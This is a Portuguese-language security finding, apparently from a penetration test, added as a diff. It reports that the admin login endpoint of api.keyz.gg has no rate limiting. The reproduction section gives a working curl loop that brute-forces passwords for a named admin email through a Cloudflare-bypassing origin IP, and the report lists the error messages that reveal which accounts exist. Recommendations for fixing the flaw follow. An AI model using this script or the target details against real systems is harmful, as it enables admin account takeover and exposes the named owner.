@@ -1,0 +1,62 @@
+# F-W2 — No rate limiting on /adm/auth (admin authentication brute force)
+
+## Severidade: Média-Alta
+
+## Host
+api.keyz.gg (via bypass Cloudflare: https://104.238.205.118/ + Host: api.keyz.gg)
+
+## Data
+2026-09-05T00:10Z
+
+## Descrição
+O endpoint de autenticação admin `POST /adm/auth` NÃO implementa rate limiting.
+Foram enviadas **132 tentativas consecutivas** com senhas diferentes para o
+admin confirmado `thyoity@gmail.com` (owner da empresa) sem NENHUM bloqueio,
+HTTP 429, ou mudança de comportamento. Todas retornaram 401 "Invalid password".
+
+Isso permite brute force ilimitado de senhas admin.
+
+## Reprodução
+
+```bash
+# 132 tentativas — nenhuma bloqueada
+for pw in $(cat admin_brute.txt); do
+  curl -k -X POST -H "Host: api.keyz.gg" -H "Content-Type: application/json" \
+    -d "{\"email\":\"thyoity@gmail.com\",\"password\":\"$pw\"}" \
+    https://104.238.205.118/adm/auth
+  # Todas: 401 {"message":"Invalid password","error":"Unauthorized"}
+done
+# Nenhum 429 (Too Many Requests) observado
+```
+
+## Output
+
+```
+pw='123456' -> HTTP 401 | {"message":"Invalid password",...}
+pw='password' -> HTTP 401 | {"message":"Invalid password",...}
+... (132 tentativas)
+pw='senha123' -> HTTP 401 | {"message":"Invalid password",...}
+```
+
+NENHUMA tentativa retornou 429, 403, ou mensagem de bloqueio.
+A senha não foi encontrada na wordlist de 132 senhas comuns, mas o
+endpoint PERMITE tentativas ilimitadas.
+
+## Respostas distintas do /adm/auth (username enumeration já conhecido F-E2)
+- "Invalid user" — conta não existe
+- "Missing access permission" — conta existe mas não é admin
+- "Invalid password" — **ADMIN** (thyoity@gmail.com)
+- 200 + {validation} — senha correta (não alcançado)
+
+## Impacto
+- Brute force offline-style de senha admin sem restrição.
+- Combinado com username enumeration (F-E2), atacante sabe QUAL conta é admin.
+- Wordlist grande + tempo = chance real de comprometer conta admin.
+- Sem lockout/CAPTCHA após N tentativas.
+
+## Recomendação
+1. Implementar rate limiting no /adm/auth (e.g. 5 tentativas / 15 min / IP).
+2. Lockout temporário após N falhas (com notificação ao admin).
+3. Adicionar CAPTCHA (Turnstile já integrado) após tentativas falhas.
+4. Logar e alertar tentativas de brute force no painel admin.
+5. Considerar delay crescente entre tentativas (backoff exponencial).
